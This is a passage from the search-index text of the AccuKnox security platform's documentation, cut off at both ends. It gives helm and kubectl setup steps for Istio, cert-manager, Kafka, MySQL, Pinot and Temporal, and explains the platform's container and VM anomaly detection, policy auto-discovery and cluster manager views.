istio-system\n</code></pre> <ul> <li>Install the Istio discovery chart which deploys the istiod control plane service</li> </ul> <pre><code>helm install istiod manifests/charts/istio-control/istio-discovery -n istio-system\n</code></pre> <ul> <li>Install the Istio ingress gateway chart which contains the ingress gateway components</li> </ul> <pre><code>helm install istio-ingress manifests/charts/gateways/istio-ingress -n istio-system\n</code></pre>"},{"location":"accuknox-onprem/onprem-setup-steps/istio/#verifying-the-installation","title":"Verifying the Installation","text":"<p>Ensure all Kubernetes pods in istio-system namespace are deployed and have a STATUS of Running</p> <p><pre><code>kubectl get pods -n istio-system\n</code></pre> </p>"},{"location":"accuknox-onprem/onprem-setup-steps/istio/#install-cert-manager","title":"Install Cert Manager","text":"<ul> <li> <p>Install cert-manager. Cert-manager will manage the certificates of gateway domains.</p> </li> <li> <p>When running on GKE (Google Kubernetes Engine), you might encounter a \u2018permission denied\u2019 error when creating some of the required resources.</p> </li> </ul> <pre><code>kubectl create clusterrolebinding cluster-admin-binding --clusterrole=cluster-admin --user=$(gcloud config get-value core/account)\n</code></pre>"},{"location":"accuknox-onprem/onprem-setup-steps/istio/#install-cert-manager_1","title":"Install Cert Manager","text":"<pre><code>kubectl apply -f https://github.com/jetstack/cert-manager/releases/download/v1.3.1/cert-manager.yaml\n</code></pre> <ul> <li>All pods should have in Running state</li> </ul> <p><pre><code>kubectl get pods -n cert-manager\n</code></pre> </p>"},{"location":"accuknox-onprem/onprem-setup-steps/istio/#installing-gateway","title":"Installing Gateway","text":"<ul> <li>Add Accuknox Repositories to install helm packages</li> </ul> <p><pre><code>helm repo add accuknox-onprem-prerequisites https://USERNAME:PASSWORD@onprem.accuknox.com/repository/accuknox-onprem-prerequisites\nhelm repo update\nhelm search repo accuknox-onprem-prerequisites\nhelm pull accuknox-onprem-prerequisites/istio-gateway-charts --untar </code></pre> + Move to directory</p> <pre><code>cd istio-gateway-charts\n</code></pre> <ul> <li> <p>Istio Gateway configurations for DNS</p> </li> <li> <p>This gateway config file defines the base API endpoints of the microservices under DNS</p> </li> <li> <p>This repository also contains necessary files to setup SSL for DNS (Refer issuer.yaml and cert.yaml) using cert-manager</p> </li> </ul>"},{"location":"accuknox-onprem/onprem-setup-steps/istio/#find-the-gateway-ip","title":"Find the Gateway IP","text":"<pre><code>INGRESS_HOST=$(kubectl -n istio-system get service istio-ingressgateway -o\u00a0jsonpath='{.status.loadBalancer.ingress[0].ip}')\necho ${INGRESS_HOST}\n</code></pre>"},{"location":"accuknox-onprem/onprem-setup-steps/istio/#create-dns-using-ip","title":"Create DNS using IP","text":"<ul> <li> <p>Create A record for example (api-onprem.accuknox.com and keycloak.example.com) using LoadBalancer IP</p> </li> <li> <p>Kindly update DNS records on cert.yaml, gateway-with-ssl.yaml, virtual-service.yaml files.</p> </li> <li> <p>Issuers, and ClusterIssuers, are Kubernetes resources that represent certificate authorities (CAs) that are able to generate signed certificates by honouring certificate signing requests.</p> </li> </ul> <p><pre><code>kubectl apply -f issuer.yaml\n# Should have Status as Ready\nkubectl get ClusterIssuer -n cert-manager\n</code></pre> + A Certificate is a namespaced resource that references an Issuer or ClusterIssuer that determines what will be honouring the certificate request.</p> <p><pre><code>kubectl apply -f cert.yaml\nkubectl get Certificate -n istio-system # Should have Status as Ready\n</code></pre> + Create Gateway with SSL <pre><code>kubectl apply -f gateway-with-ssl.yaml\n</code></pre></p>"},{"location":"accuknox-onprem/onprem-setup-steps/istio/#apply-virtual-services","title":"Apply Virtual services","text":"<ul> <li>A virtual service defines a set of traffic routing rules to apply when a host is addressed. Each routing rule defines matching criteria for the traffic of a specific protocol. If the traffic is matched, then it is sent to a named destination service (or subset/version of it) defined in the registry.</li> </ul> <pre><code>kubectl apply -f backend-api/virtual-service.yaml\nkubectl apply -f keycloak/virtual-service.yaml\n</code></pre>"},{"location":"accuknox-onprem/onprem-setup-steps/kafka/","title":"Kafka","text":"<pre><code>helm pull accuknox-onprem-prerequisites/strimzi-kafka-operator --untar\nhelm install accuknox-kafka\u00a0 strimzi-kafka-operator -n accuknox-kafka\n</code></pre> <ul> <li> <p>Check the Pods, Pods should have the running status <pre><code>kubectl get pods -n accuknox-kafka\n</code></pre> </p> </li> <li> <p>Get Bootstrap server endpoint</p> </li> </ul> <pre><code>kubectl get kafka accuknox -o jsonpath='{.status.listeners[?(@.type==\"external\")].bootstrapServers}' -n accuknox-kafka\n</code></pre> <ul> <li>Get CA certificate</li> </ul> <pre><code>kubectl get secret accuknox-cluster-ca-cert -o jsonpath='{.data.ca\\.p12}' -n accuknox-kafka | base64 -d &gt; ca.p12\n</code></pre>"},{"location":"accuknox-onprem/onprem-setup-steps/kafka/#notes","title":"Notes","text":"<ul> <li> <p>For any application connecting to Kafka outside the GKE, It needs to communicate via SSL/TLS authentication.</p> </li> <li> <p>We need to provide the connectivity details to the component owners who are configuring the application deployed outside GKE Cluster.</p> </li> <li> <p>Get CA Password</p> </li> </ul> <p><pre><code>kubectl get secret accuknox-cluster-ca-cert -o jsonpath='{.data.ca\\.password}' -n accuknox-kafka | base64 -d &gt; ca.password\n</code></pre> + Get User Certificate <pre><code>kubectl get secret/node-event-feeder-common -n accuknox-kafka -o jsonpath='{.data.user\\.p12}' | base64 -d &gt; user.p12\n</code></pre> + Get User Password</p> <pre><code>kubectl get secret/node-event-feeder-common -n accuknox-kafka -o jsonpath='{.data.user\\.password}' | base64 -d &gt; user.password\n</code></pre> <ul> <li>Convert user.p12 to base64 encoded format <pre><code>cat user.p12 | base64 &gt; user.p12.base64\n</code></pre></li> <li> <p>Convert ca.p12 to base64 encoded format <pre><code>cat ca.password | base64 &gt; ca.password.base64\n</code></pre></p> </li> <li> <p>Convert user.password to base64 encoded format <pre><code>cat user.password | base64 &gt; user.password.base64\n</code></pre></p> </li> <li> <p>Convert p12 to pem format <pre><code>openssl pkcs12 -in ca.p12 -out ca.pem\n</code></pre> </p> </li> </ul> <p>Note: Copy the password from ca.password (file)</p> <ul> <li>Convert ca.pem to base64 encoded format <pre><code>cat ca.pem | base64 &gt; ca.pem.base64\n</code></pre></li> </ul>"},{"location":"accuknox-onprem/onprem-setup-steps/kafka/#note","title":"Note","text":"<ul> <li> <p>ca.p12, ca.password, user.p12 and user.password are required to be used in Java based applications. For Go based applications, use ca.pem, user.p12 and user.password. For use in Kubernetes, use the base64 versions of respective files.</p> </li> <li> <p>FQDN (K8\u2019s Service name) Value for Internal Cluster application connectivity.</p> </li> <li> <p>FQDN : accuknox-kafka-bootstrap.accuknox-kafka.svc.cluster.local:9092</p> </li> </ul>"},{"location":"accuknox-onprem/onprem-setup-steps/kafka/#get-certificates-and-store-it","title":"Get Certificates and store it","text":"<ul> <li> <p>If the kafka cluster is upgraded or reinstalled, then the cluster will generate new certificates and you need to change/update key-pair in the kafka clients or applications.</p> </li> <li> <p>To mitigate this issue store these below certificates in safe place at the time of installing kafka(first time installation).</p> </li> <li> <p>Manually apply these certificates using \"kubectl\" command or place under templetes folder. And also turn off the auto certificate generation by configuring(uncomment) \"clusterca\" and \"clientsca\" to \"false\" in \"kafka-cluster.yaml\" file(below image is for your reference). Once done the changes, install/upgarde the cluster.</p> </li> </ul> <p></p> <pre><code>kubectl get secret/accuknox-clients-ca -o yaml -n accuknox-kafka &gt; accuknox-clients-ca.yaml\nkubectl get secret/accuknox-clients-ca-cert -o yaml -n accuknox-kafka &gt; accuknox-clients-ca-cert.yaml\nkubectl get secret/accuknox-cluster-ca-cert -o yaml -n accuknox-kafka &gt; accuknox-cluster-ca-cert.yaml\nkubectl get secret/accuknox-cluster-ca -o yaml -n accuknox-kafka &gt; accuknox-cluster-ca.yaml\nkubectl get secret/node-event-feeder -o yaml -n accuknox-kafka &gt; node-event-feeder.yaml\nkubectl get secret/node-event-feeder-common -o yaml -n accuknox-kafka &gt; node-event-feeder-common.yaml\n</code></pre>"},{"location":"accuknox-onprem/onprem-setup-steps/kafka/#verify-kafka-cluster-is-ready-or-not","title":"Verify Kafka cluster is ready or not","text":"<p><pre><code>kubectl get kafka -n accuknox-kafka\n</code></pre> </p>"},{"location":"accuknox-onprem/onprem-setup-steps/kafka/#everything-should-be-in-running-and-ready-state","title":"Everything should be in Running and Ready state","text":"<pre><code>kubectl get all -n accuknox-kafka\n</code></pre>"},{"location":"accuknox-onprem/onprem-setup-steps/mysql/","title":"Mysql","text":"<pre><code>helm pull accuknox-onprem-prerequisites/mysql-chart --untar\nkubectl create namespace accuknox-mysql\ncd mysql-chart\nkubectl apply -f bundle.yaml -n accuknox-mysql\nkubectl apply -f cr.yaml -n accuknox-mysql\nkubectl apply -f secrets.yaml -n accuknox-mysql\nkubectl apply -f ssl-secrets.yaml -n accuknox-mysql\n</code></pre>"},{"location":"accuknox-onprem/onprem-setup-steps/mysql/#verify-installation","title":"Verify Installation","text":"<p><pre><code>kubectl get secret -n accuknox-mysql | grep mysql\n</code></pre> </p> <pre><code>kubectl apply -f backup-s3.yaml -n accuknox-mysql\n</code></pre>"},{"location":"accuknox-onprem/onprem-setup-steps/mysql/#loading-schema","title":"Loading schema","text":"<p><pre><code>helm pull accuknox-onprem-prerequisites/mysql-schema-chart --untar\nhelm upgrade --install accuknox-mysql-schema\u00a0mysql-schema-chart -n accuknox-mysql\n</code></pre> All pods should have in Running state</p> <p><pre><code>kubectl get pods -n accuknox-mysql\n</code></pre> </p>"},{"location":"accuknox-onprem/onprem-setup-steps/mysql/#notes","title":"Notes","text":"<ul> <li> <p>To configure backup with GCS, add the HMAC keys in backup-s3.yaml, change the bucket name in cr.yaml and change the cron job entries as per the requirement in the cr.yaml.</p> </li> <li> <p>HMAC Keys will vary for cloud providers. (GCP, AZURE, AWS)</p> </li> </ul> <p>After following steps the above steps, you will see a similar image as above Run a sanitary test with below commands at the MySQL namespace</p> <pre><code>kubectl run -i --rm --tty percona-client --image=percona:8.0 --restart=Never -n accuknox-mysql -- bash -il\nmysql -h accuknox-mysql-haproxy -uroot -proot_password\n</code></pre> <p>Update the passwords in secret.yaml file and run below command</p> <pre><code>kubectl apply -f secrets.yaml\n</code></pre>"},{"location":"accuknox-onprem/onprem-setup-steps/mysql/#optional","title":"Optional","text":"<p>To configure backup with gcs add the HMAC keys in backup-s3.yaml, change the bucket name in cr.yaml and cron can be changed as required cr.yaml files.</p> <p>FQDN: For K8\u2019s Service name</p> <pre><code>accuknox-mysql-haproxy.accuknox-mysql.svc.cluster.local\n</code></pre>"},{"location":"accuknox-onprem/onprem-setup-steps/pinot/","title":"Pinot","text":"<pre><code>helm pull accuknox-onprem-prerequisites/pinot-chart --untar\nkubectl create namespace accuknox-pinot\nhelm install accuknox-pinot pinot -n accuknox-pinot\n</code></pre>"},{"location":"accuknox-onprem/onprem-setup-steps/pinot/#everything-should-be-in-running-and-ready-state","title":"Everything should be in Running and Ready state","text":"<p><pre><code>kubectl get pods -n accuknox-pinot\n</code></pre> </p>"},{"location":"accuknox-onprem/onprem-setup-steps/pinot/#loading-schema-and-tables","title":"Loading Schema and Tables","text":"<p>To load schema, It is necessary to open the Pinot dashboard. Run the below command to do port-forward and open http://localhost:9000/  in the browser.</p> <p><pre><code>kubectl port-forward svc/accuknox-pinot-controller -n accuknox-pinot 9000:9000\n</code></pre> </p> <p>Select Swagger REST API from the side panel</p> <p></p>"},{"location":"accuknox-onprem/onprem-setup-steps/pinot/#schema-creation","title":"Schema Creation","text":"<p>Download the pinot-schemas.zip file and unzip it and load all the schemas using below steps:</p> <p>Click to Download Pinot Schemas</p> <ul> <li>Under schema,  Select POST  /schemas Add a new schema</li> </ul> <p></p> <ul> <li>Click Try it out</li> </ul> <p></p> <ul> <li>Paste the schema file at body object and Execute</li> </ul> <p></p> <ul> <li>It should be 200 response codes and follow the same steps to create all schemas.</li> </ul> <p></p>"},{"location":"accuknox-onprem/onprem-setup-steps/pinot/#tables-creation","title":"Tables Creation","text":"<p>Download the pinot-table.zip file and unzip it. Please load all the tables using the below steps.</p> <p>Click to Download Pinot Tables</p> <ul> <li>Under TABLE Select POST /tables Add a new table.</li> </ul> <p></p> <ul> <li>Click Try it out</li> </ul> <p></p> <p>Paste Table configuration  file at body object and Execute</p> <p></p> <ul> <li>It should be 200 response codes and follow the same steps to create all tables.</li> </ul> <p></p>"},{"location":"accuknox-onprem/onprem-setup-steps/temporal/","title":"Temporal","text":"<ul> <li>Temporal operator deployment steps</li> </ul> <pre><code>kubectl create ns accuknox-temporal\ngit clone https://github.com/temporalio/helm-charts.git\nmv helm-charts temporal-server-chart\nhelm dep up temporal-server-chart\nhelm upgrade --install accuknox-temporal-server temporal-server-chart  --set server.replicaCount=1 --set cassandra.config.cluster_size=1 --set prometheus.enabled=false --set grafana.enabled=false --set elasticsearch.enabled=false --timeout 15m -n accuknox-temporal\n</code></pre> <ul> <li>If Prometheus/ Grafana is not required, Use the below command.</li> </ul> <pre><code>helm install --set server.replicaCount=1 --set cassandra.config.cluster_size=1 --set prometheus.enabled=false --set grafana.enabled=false --set elasticsearch.enabled=false temporal . --timeout 15m -n accuknox-temporal\nkubectl get all -n temporal-server\n</code></pre> <ul> <li>Set the namespace to default</li> </ul> <pre><code>kubectl exec -n accuknox-temporal -it  pod/temporaltest-admintools-&lt;pod-id&gt; -- /bin/bash\ntctl --ns accuknox-temporal n re\n</code></pre> <p>For example, </p> <ul> <li>Port-forward the temporal-web (:8088) pod to view the temporal workflows UI.</li> </ul> <pre><code>kubectl port-forward svc/accuknox-temporal-server-web 8088:8088 -n accuknox-temporal\n</code></pre>"},{"location":"accuknox-onprem/onprem-setup-steps/what-is-next/","title":"What is next","text":"<p>How to onboard a K8\u2019s Cluster into AccuKnox</p>"},{"location":"anomaly-detection/how-does-it-work/","title":"How does it work","text":""},{"location":"anomaly-detection/how-does-it-work/#how-does-it-work","title":"How does it work","text":"<p>Anomaly Detection has 2 phases: The training phase and the testing phase.</p> <p>Training phase: In this time period, Anomaly Detection monitors the container behavior. It monitors the system, process, and network activity of the container and creates mathematical training vectors. When the training time is completed, it uses the training vectors to create a mathematical model for the container.</p> <p>Testing phase: After completing the training phase, Anomaly Detection starts to evaluate the new data against the models.</p>"},{"location":"anomaly-detection/how-to-train-containers/","title":"How to Train Containers","text":""},{"location":"anomaly-detection/how-to-train-containers/#how-to-train-containers","title":"How to Train Containers","text":"<ol> <li>Log in to your workspace in the Accuknox dashboard. </li> <li>On the left navigation pane, select the Anomaly Detection \u2192 Train containers </li> <li>Select the cluster in which you want the containers to train. </li> <li>Click on the Node Name to list out the containers. </li> </ol> <ol> <li>Select the containers and click on Train selected containers button on the right top corner. </li> </ol> <ol> <li>Now enter the training name and training time, then click on the Start Training button.</li> <li>After containers are trained, we can see the activities of the container and logs for each container in the Container Audit &amp; Logs screen.</li> </ol>"},{"location":"anomaly-detection/how-to-train-vm/","title":"How to Train VMs","text":""},{"location":"anomaly-detection/how-to-train-vm/#how-to-train-vm","title":"How to Train VM?","text":"<ol> <li> <p>Log in to your workspace in the AccuKnox dashboard. </p> </li> <li> <p>On the left navigation pane, select the Anomaly Detection \u2192 Train containers &amp; VM.</p> </li> <li> <p>By default K8s will be there so, switch to VM mode by using Drop down.</p> </li> <li> <p>Select the VM Instance  in which you want the VM processes to train.</p> </li> <li> <p>Click on the VM to list out the Processes under the VM.</p> </li> </ol> <p></p> <ol> <li>Select the Processes which you want to train and click on Train selected button on the right top corner.</li> </ol> <p></p> <ol> <li> <p>Now enter the training name and training time, then click on the Start Training button.</p> </li> <li> <p>After VM Processes are trained, we can see the activities of the VM and logs for each Process in the Audit &amp; Logs screen.</p> </li> </ol>"},{"location":"anomaly-detection/pre-requisites-installation-requirements-for-k8s/","title":"Pre-requisites/Installation/Requirements for k8s","text":""},{"location":"anomaly-detection/pre-requisites-installation-requirements-for-k8s/#pre-requisitesinstallationrequirements-for-k8s","title":"Pre-requisites/Installation/Requirements for k8s","text":""},{"location":"anomaly-detection/pre-requisites-installation-requirements-for-k8s/#pre-requisites","title":"Pre-requisites","text":"<ul> <li>Cluster nodes with Docker as the container runtime. (COS, and Ubuntu both are supported).</li> <li>Cluster onboarded to Accuknox.</li> <li>Cluster_ID and Workspace_ID are provided by Accuknox.</li> </ul> <p><code>Note: Currently, the agents only support docker as the container runtime. Support for containerd will be added soon. Till then, make sure that the cluster onboarded has nodes with Docker as runtime.</code></p>"},{"location":"anomaly-detection/pre-requisites-installation-requirements-for-k8s/#installation-guide","title":"Installation Guide","text":"<p>If you don't onboard your cluster to Accuknox platform Please follow the steps here</p>"},{"location":"anomaly-detection/pre-requisites-installation-requirements-for-vm/","title":"Pre-requisites/Installation/Requirements for VMs","text":""},{"location":"anomaly-detection/pre-requisites-installation-requirements-for-vm/#pre-requisites","title":"Pre-requisites","text":"<ul> <li>Ubuntu VM </li> <li>VM onboarded to Accuknox.</li> </ul> <p>Note</p> <p>Only supports ubuntu VMs for the current version.</p>"},{"location":"anomaly-detection/pre-requisites-installation-requirements-for-vm/#installation-guide","title":"Installation Guide","text":"<p>If you don't onboard your VM to the Accuknox platform, Please follow the steps here.</p>"},{"location":"anomaly-detection/vm-audit-and-logs/","title":"VM audit & logs","text":""},{"location":"anomaly-detection/vm-audit-and-logs/#what-does-the-audit-logs-mean","title":"What does the Audit &amp; Logs mean?","text":"<ul> <li> <p>The screen displays the Alert Summary and the logs being generated from the VAE core. </p> </li> <li> <p>After a model is trained for a VM process, the VM is monitored and VAE calculates the reconstruction error for that model. </p> </li> <li> <p>Reconstruction error: In the testing phase, Anomaly detection compares the VM\u2019s current behavior with the model that has been created and calculates a mean squared error called the reconstruction error.</p> </li> <li> <p>Since the behavior of the VM cannot be exactly the same as it was during the training period, a baseline of value 10 is used to filter out false positives. If the reconstruction error goes above 10, then the behavior is considered anomalous and an alert log is sent out. The alert log consists of the value of the reconstruction error along with the summary of the VM during that timestamp. The summary includes:</p> </li> <li> <p>General information </p> </li> <li>Instance name, </li> <li>Instance Group, </li> <li>Instance ID, </li> <li>status of Instance, </li> <li> <p>command issued at the given timestamp.</p> </li> <li> <p>VM resource information </p> </li> <li>CPU, </li> <li>memory, </li> <li>read/write block, </li> <li> <p>process count.</p> </li> <li> <p>Process activities </p> </li> <li>forked, </li> <li>executed, </li> <li> <p>killed process count.</p> </li> <li> <p>File activities </p> </li> <li>opened, </li> <li>deleted, </li> <li>created,  </li> <li> <p>file count, etc.</p> </li> <li> <p>Network activities </p> </li> <li>inbound/outbound connections, </li> <li> <p>port counts, etc.</p> </li> <li> <p>On the left side of the VM audit log screen, we can see an Alert summary of each Instance or VM consisting of Instance name, each Process, Alert counts, and severities.</p> </li> <li> <p>Select any Process in the alert summary to see the detailed forensic view of the particular VM.</p> </li> <li> <p>Audit &amp; Logs screen visualises the reconstruction error over time in a graph. This way, the user can look at the graph and see if the VM has been in an anomalous  state for a long period of time. </p> </li> </ul>"},{"location":"anomaly-detection/what-does-the-container-audit-and-logs-mean/","title":"What does the Container Audit & Logs mean","text":""},{"location":"anomaly-detection/what-does-the-container-audit-and-logs-mean/#what-does-the-container-audit-logs-mean","title":"What does the Container Audit &amp; Logs mean","text":"<ul> <li> <p>The screen displays the Alert Summary and the logs being generated from the VAE core.\u00a0</p> </li> <li> <p>After a model is trained for a container, the container is monitored and VAE calculates the reconstruction error for that model.\u00a0</p> </li> <li> <p>Reconstruction error: In the testing phase, Anomaly detection compares the container\u2019s current behavior with the model that has been created and calculates a mean squared error called the reconstruction error. </p> </li> <li> <p>Since the behavior of the container cannot be exactly the same as it was during the training period, a baseline of value 10 is used to filter out false positives. If the reconstruction error goes above 10, then the behavior is considered anomalous and an alert log is sent out. The alert log consists of the value of the reconstruction error along with the summary of the container during that timestamp. The summary includes:</p> </li> <li> <p>General information (container name, node, cluster, container_id, status of container, command issued at the given timestamp)</p> </li> <li> <p>Container resource information (CPU, memory, read/write block, process count)</p> </li> <li> <p>Process activities (forked, executed, and killed process count)</p> </li> <li> <p>File activities (opened, deleted, created, etc. file count)</p> </li> <li> <p>Network activities ( inbound/outbound connections, port counts, etc.)</p> </li> <li> <p>On the left side of the container audit log screen, we can see an Alert summary of each container consisting of container name, Alert counts, and severities.</p> </li> <li> <p>Select any container in the alert summary to see the detailed forensic view of the particular container.  </p> </li> <li> <p>Container Audit &amp; Logs screen visualises the reconstruction error over time in a graph. This way, the user can look at the graph and see if the container has been in an anomalous state for a long period of time.\u00a0</p> </li> <li> <p>Along with the reconstruction error, other information about the container is also sent out like container name, container ID, timestamp, commands, etc.</p> </li> </ul>"},{"location":"anomaly-detection/what-is-anomaly-detection/","title":"What is Anomaly Detection","text":""},{"location":"anomaly-detection/what-is-anomaly-detection/#what-is-anomaly-detection","title":"What is Anomaly Detection","text":"<p>Anomaly detection is a tool that finds the outliers of a dataset; those items that don\u2019t belong. These anomalies might point to unusual network traffic, uncover a sensor on the fritz, or simply identify data for cleaning, before analysis.</p> <p>VAE is an autoencoder whose encoding distribution is regularized during the training in order to ensure that its latent space has good properties allowing us to generate some new data. Moreover, the term \u201cvariational\u201d comes from the close relation there is between the regularization and the variational inference method in statistics.</p>"},{"location":"auto_discovery_of_policies/auto_discovery_of_policies/","title":"Auto discovery of policies","text":"<p>Auto Discovery is a policy recommendation system that suggests network and system policies based on the collected network and system logs respectively.</p> <p>Auto Discovery is available only for Kubernetes environments right now; it focuses on pods/services, and its fundamental principle is to produce a minimal network and system policy set covering maximum behavior. To do this, we actively use the label information assigned from the Kubernetes workloads/resources.</p> <p>Currently, Auto Discovery can discover (i) egress/ingress network policy for Pod-to- Pod, (External)Service, Entity, CIDR, FQDN, HTTP. And, In the System perspective it can discover (ii) process, file, and network-relevant system policy.</p>"},{"location":"auto_discovery_of_policies/auto_discovery_of_policies/#functionality-overview","title":"Functionality Overview","text":"<ul> <li> <p>Produce a minimum network policy set covering maximum network flows</p> <ul> <li>When discovering the network policies, if we generate the policies applied to a single pod statically, there would be lots of network policies. In contrast, Auto Discovery produces the minimum network policy set that can cover the maximum network flows so that we can manage the network policies more efficiently and effectively. For example, Auto Discovery collects the label information of the pods, and then computes the intersection of labels, which is the most included in the source (or destination) pods.</li> </ul> </li> <li> <p>Identify overlapped network policy</p> <ul> <li> <p>Regarding the external destination, Auto Discovery builds CIDR or FQDN-based policies, and to do this it takes two steps. First, if it comes across the external IP address as the destination, it tries to convert the IP address to the domain name by leveraging the reverse domain services. Next, if it fails to find the domain name, it retrieves the domain name from an internal map that matches the domain name to the IP address collected by DNS query and response packets from the kube-dns traffic. Thus, building FQDN based policies has a higher priority than CIDR policies.</p> <p>Inevitably, CIDR policies could be discovered if there is no information on the matched domain names. However, if we build an FQDN policy that overlaps the prior CIDR policy, Auto Discovery can tag and update those policies so that we can maintain the latest network policies.</p> </li> </ul> </li> <li> <p>Operate in runtime or on the collected network logs in advance</p> <ul> <li>Generally, Auto Discovery discovers the network policies by extracting the network logs from the database every time intervals. In addition, It can connect to a log monitor directly (e.g., Cilium Hubble), and receive the network log, and then produce the network policies in runtime.</li> </ul> </li> <li> <p>Support various network and system policy discovery modes</p> <ul> <li>Fundamentally, a pod has two types of network policy in Kubernetes; egress and ingress. The egress policy restricts the outbound network flows and the other way, the ingress policy operates against the inbound network flows. In this context, Auto Discovery supports both types of policy discovery modes; egress-centric and ingress-centric. Additionally System-centric also. System Policy can be of process, file, and network types. Thus, users can choose one of them depending on their demand.</li> </ul> </li> </ul>"},{"location":"auto_discovery_of_policies/auto_discovery_of_policies/#policy-discovery-examples","title":"Policy Discovery Examples","text":""},{"location":"auto_discovery_of_policies/auto_discovery_of_policies/#the-intersection-of-matched-labels","title":"The intersection of matched labels","text":"<p> Let's assume that there are three pods and two connections between them as shown in the above figure. From the network logs from it, the Auto Discovery does not discover the two distinct network policies; [Pod A -&gt; Pod C] and [Pod A -&gt; Pod C].</p> <p>Instead, since Pod A and Pod B have the intersection of the labels, which is 'group=alice', the knoxAutoPolicy discovers and generates a network policy that has the selector with matchLabels 'group=alice'. Finally, we can get one network policy that covers two distinct network flows [group=alice -&gt; Pod C].</p>"},{"location":"auto_discovery_of_policies/auto_discovery_of_policies/#the-aggregation-of-toports-rules-per-the-same-destination","title":"The aggregation of toPorts rules per the same destination","text":"<p>Similar to the previous case, we can merge the multiple toPorts rules per each same destination. Let's assume that there are the source and destination pods and three different flows as shown in the above figure. In this case, the Auto Discovery does not generate three different network policies per each toPorts rule.</p> <p>More efficiently, the Auto Discovery discovers one network policy and has one matchLabel rule and three toPorts rules; port numbers are 443, 8080, and 80. From this merge, it can be enabled to produce a minimum network policy set covering maximum network flows.</p>"},{"location":"auto_discovery_of_policies/auto_discovery_of_policies/#the-trace-of-the-outdated-network-policy","title":"The trace of the outdated network policy","text":"<p>Since the Auto Discovery can do the discovery job at the time intervals, there could be some overlapping. For example, as shown in the above figure, let's assume we discovered policy A and B at the time t1 and t2 respectively.</p> <p>However, policy B has the same toCIDRs rule as policy A does but a different toPorts rule. In this case, It updates policy B by merging the toPorts rule to the latest one, and then it marks policy A as outdated and puts the relevant latest policy name. Thus, users can retrieve only the latest network policies from the database.</p>"},{"location":"auto_discovery_of_policies/auto_discovery_of_policies/#auto-discovered-policies-dashboard","title":"Auto Discovered Policies Dashboard","text":"<ul> <li> <p>You can filter Auto Discovered Policies using following filters:</p> <ul> <li> <p>Cluster :- Filter Policies by clusters belonging to your workspace.</p> </li> <li> <p>Namespace: Filter Policies by namespaces belonging to selected clusters</p> </li> <li> <p>Policy-Type: Filter Policies by Policy types. There are 3 Policy types. (i) Network-Ingress (ii) Network-Egress (iii) System Policy</p> </li> <li> <p>Category: Category will give the status of the policies. There are 2 categories.</p> <ul> <li> <p>Used : When the Policy is applied from the Auto Discovered Policy Screen, It will go to All Policy Screen and Category will be changed to Used. You can list all used policies with used category.</p> </li> <li> <p>Ignore: You can list all ignored policies using this filter.</p> </li> </ul> </li> </ul> </li> <li> <p>Select one or more policies from the list          Note: Default screen will show all un-used policies.</p> </li> <li> <p>Click \u201cAction\u201d Button on the top right corner.          There are 3 Actions can be performed. (i) Apply (ii) Ignore (iii) Deselect all</p> </li> <li> <p>Click Apply. Then Policy will be applied to the cluster. Applied Policy will go to pending approval.     </p> </li> <li> <p>Go to \u201cPending Approval\u201d screen and Approve the policy.          Note: You need Administrative permission to approve policies.</p> </li> <li> <p>Approved Policy will go to All Policies Screen.</p> </li> </ul>"},{"location":"auto_discovery_of_policies/auto_discovery_of_policies/#apply-auto-discovered-policies","title":"Apply Auto Discovered Policies.","text":""},{"location":"cluster_manager/cluster-management/","title":"Overview","text":"<p>Cluster Manager allows you to get deep observability into your Kubernetes and VM workloads.</p> <p>The module provides a unified view of your Kubernetes and VM infrastructure. A single dashboard for VM workloads as well as Kubernetes Clusters, Nodes, Pods, and Namespaces. You can easily filter by any of these entities and view associated details.</p> <p>There are two views in the Cluster Manager Dashboard</p> <ul> <li> <p>List View</p> </li> <li> <p>Graph View</p> </li> </ul> <p>Observability into kubernetes cluster</p> <p>Observability into VM/Bare-metal</p>"},{"location":"cluster_manager/k8s-cluster-management/","title":"Observability into kubernetes cluster","text":""},{"location":"cluster_manager/k8s-cluster-management/#observability-into-your-kubernetes-cluster","title":"Observability into your Kubernetes cluster","text":"<p>Select <code>Cluster Manager</code> \u2192 <code>K8s Cluster</code></p> <p>The following three views will give three different levels of visibility into your Kubernetes clusters.</p> <ul> <li> <p>Cluster View (Default Screen)</p> </li> <li> <p>Node View</p> </li> <li> <p>Pod View</p> </li> </ul> <p>All Cluster Manager screens have a time filter in the top right corner that can be used to filter by the time intervals.</p> <p></p> <p>Fig: Right-click on the cluster/node/pod</p> <p>From Cluster Manager screens you can do the following operations. It acts as a hybrid screen.</p> <ul> <li> <p>Add Policies</p> </li> <li> <p>Add Label</p> </li> <li> <p>View Policies</p> </li> <li> <p>View Recommended Policies</p> </li> </ul> <p>You can make use of all these functionalities in all three views of the cluster manager. You have the additional option of View Pods in the Cluster View.</p>"},{"location":"cluster_manager/k8s-cluster-management/#cluster-view","title":"Cluster View","text":"<p>This discusses the Clusters View page and helps you understand the data displayed on the screen.</p> <p>The Cluster Overview page provides key metrics such as labels, the number of nodes, the number of policies, alerts, etc. of each cluster. Your cluster can reside in any cloud environment of your choice.</p> <p>Each row represents a cluster. You can further drill down to the Nodes or Pods View page.</p> <p></p>"},{"location":"cluster_manager/k8s-cluster-management/#cluster-data","title":"Cluster Data","text":"<p>Number of nodes:- Kubernetes runs your workload by placing containers into Pods to run on Nodes. The number shows the available nodes across the entire cluster.</p> <p>Number of pods:- The number shows available pods across the entire cluster.</p> <p>Number of Policies:- The number shows the number of active policies across the entire cluster.</p> <p>Alerts:- Number of alerts across the entire cluster.</p> <p>Location:- The zone/region in which your cluster (control plane and nodes) are located.</p>"},{"location":"cluster_manager/k8s-cluster-management/#node-view","title":"Node View","text":"<p>Left Click on any cluster from the cluster view screen will take you to Node view.</p> <p></p>"},{"location":"cluster_manager/k8s-cluster-management/#node-data","title":"Node Data","text":"<p>Labels:- Number of available labels on specific node.</p> <p>Number of pods: Number of pods successfully scheduled at a specific node.</p> <p>Number of Policies: Number of Host polices applied to specific node. Host policies apply to all the nodes selected by their Node Selector.</p> <p>Alerts: Number of alerts across the specific node.</p> <p>Location: The zone/region in which your cluster (control plane and nodes) are located.</p>"},{"location":"cluster_manager/k8s-cluster-management/#pod-view","title":"Pod View","text":"<p>Left click on any node from the node view will take you to Pod view screen. This view will list all the pods in the node along with details.</p> <p></p>"},{"location":"cluster_manager/k8s-cluster-management/#pod-data","title":"Pod Data","text":"<p>Workload: Workload column is giving workload identity of the given pod. Workload is identified by the Accuknox workload identification engine. Accuknox will recommend policies based on this workload identification.</p> <p>Labels: Number of available labels on a specific pod.</p> <p>Number of containers: Available number of containers inside a pod.</p> <p>Number of Policies: Number of policies applied to the pod.</p> <p>Location: The 